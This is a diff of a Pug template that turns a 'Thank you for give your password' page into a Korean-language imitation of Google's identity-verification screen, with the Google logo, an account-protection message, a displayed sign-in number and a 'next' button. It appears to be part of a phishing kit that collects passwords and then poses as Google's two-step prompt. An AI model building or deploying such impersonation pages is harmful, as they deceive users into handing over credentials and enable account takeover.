@@ -1,3 +1,20 @@
 html 
+    head
+        link(rel="stylesheet", href="/assets/css/result.css")
     body 
-        h1 Thank you for give your password
+        div.container
+            header.container__header
+                img(src="/assets/imgs/Google_logo.png", alt="Google Logo").Logo
+            section.container__title 
+                h1 
+                    span.title  본인인증
+                p.sub_title 계정 보호를 위해 Google에서 본인 확인을 진행합니다 
+            main.container__main 
+                h1 84
+            section.container__guest 
+                div
+                    p 내 컴퓨터가 아닌가요? 게스트 모드를 사용하여 비공개로 로그인하세요. 
+                    a(href="https://support.google.com/chrome/answer/6130773?hl=ko" target="_black") 자세히 알아보기 
+            footer.container__footer
+                a(href="/") 계정 만들기
+                button.next 다음
